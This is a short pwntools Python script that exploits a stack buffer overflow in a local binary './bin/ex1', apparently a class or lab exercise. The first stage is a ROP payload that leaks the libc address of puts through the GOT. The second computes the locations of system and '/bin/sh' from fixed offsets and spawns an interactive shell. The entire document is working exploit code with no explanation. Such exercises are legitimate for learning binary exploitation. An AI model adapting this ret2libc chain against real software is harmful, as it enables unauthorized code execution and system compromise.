#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

target = process("./bin/ex1")

io = gdb.debug(
    "./bin/ex1",
    """
    break ex1.c:17
    c
    c
    """,
    terminal=["gnome-terminal", "--geometry=160x80", "-e"],
)

puts_plt = p64(0x401050)
puts_got = p64(0x404018)

rop_gadget1 = p64(0x401193) #ce trebuie 
rop_gadget2 = p64(0x401192)#pop rsi ; pop rdi ; pop rbp ; ret

bin_sh_offset = 0x157828
system_offset = -0x300E0

main = p64(0x401196)

payload = b"A" * 0x28 + rop_gadget1 + puts_got + b"A" * 0x8 + puts_plt + main


io.recvline()
io.recvline()
io.sendline(payload)
aux = io.recvline().strip().ljust(8, b"\x00")
print(aux)
puts_leak = u64(aux)
print(hex(puts_leak))
io.recvline()
io.recvline()

payload = (
    b"A" * 0x28
    + rop_gadget2
    + b"A" * 0x8
    + p64(puts_leak + bin_sh_offset)
    + b"A" * 0x8
    + p64(puts_leak + system_offset)
)

io.sendline(payload)
io.interactive()
